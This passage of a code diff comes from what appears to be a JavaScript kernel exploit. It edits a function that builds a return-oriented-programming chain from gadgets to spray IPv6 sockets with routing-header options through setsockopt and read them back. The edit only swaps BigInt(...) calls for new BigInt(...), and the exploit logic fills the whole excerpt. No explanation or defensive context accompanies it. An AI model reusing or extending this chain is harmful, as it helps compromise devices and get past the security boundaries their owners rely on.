   rop.push(rtprio_buf);
   rop.push(rtprio_thread_wrapper);
@@ -2031,7 +2036,7 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
   rop.push(gadgets.POP_RDI_RET);
   rop.push(ready_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
   var loop_init = rop.length;
 
@@ -2041,7 +2046,7 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
   rop.push(gadgets.POP_RSI_RET);
   rop.push(signal_buf);
   rop.push(gadgets.POP_RDX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(read_wrapper);
 
   // Spray all sockets
@@ -2049,9 +2054,9 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     rop.push(gadgets.POP_RDI_RET);
     rop.push(ipv6_socks[i]);
     rop.push(gadgets.POP_RSI_RET);
-    rop.push(BigInt(IPPROTO_IPV6));
+    rop.push(new BigInt(IPPROTO_IPV6));
     rop.push(gadgets.POP_RDX_RET);
-    rop.push(BigInt(IPV6_RTHDR));
+    rop.push(new BigInt(IPV6_RTHDR));
     rop.push(gadgets.POP_RCX_RET);
     rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)); // Offset for socket i
 
@@ -2059,7 +2064,7 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));
 
     rop.push(gadgets.POP_R8_RET);
-    rop.push(BigInt(spray_rthdr_len));
+    rop.push(new BigInt(spray_rthdr_len));
     rop.push(setsockopt_wrapper);
   }
 
@@ -2070,9 +2075,9 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
     // debug("");
     // debug("pushed sock: " + hex(ipv6_socks[i]));
     rop.push(gadgets.POP_RSI_RET);
-    rop.push(BigInt(IPPROTO_IPV6));
+    rop.push(new BigInt(IPPROTO_IPV6));
     rop.push(gadgets.POP_RDX_RET);
-    rop.push(BigInt(IPV6_RTHDR));
+    rop.push(new BigInt(IPV6_RTHDR));
     rop.push(gadgets.POP_RCX_RET);
     rop.push(read_rthdr_rop.add(_i15 * 8)); // Offset for socket i
     // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
@@ -2085,12 +2090,12 @@ function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_
   rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
   rop.push(done_signal);
   rop.push(gadgets.POP_RAX_RET);
-  rop.push(BigInt(1));
+  rop.push(new BigInt(1));
   rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
 
   // Exit
   rop.push(gadgets.POP_RDI_RET);
-  rop.push(BigInt(0));
+  rop.push(new BigInt(0));
   rop.push(thr_exit_wrapper);
 
   // It's gonna loop
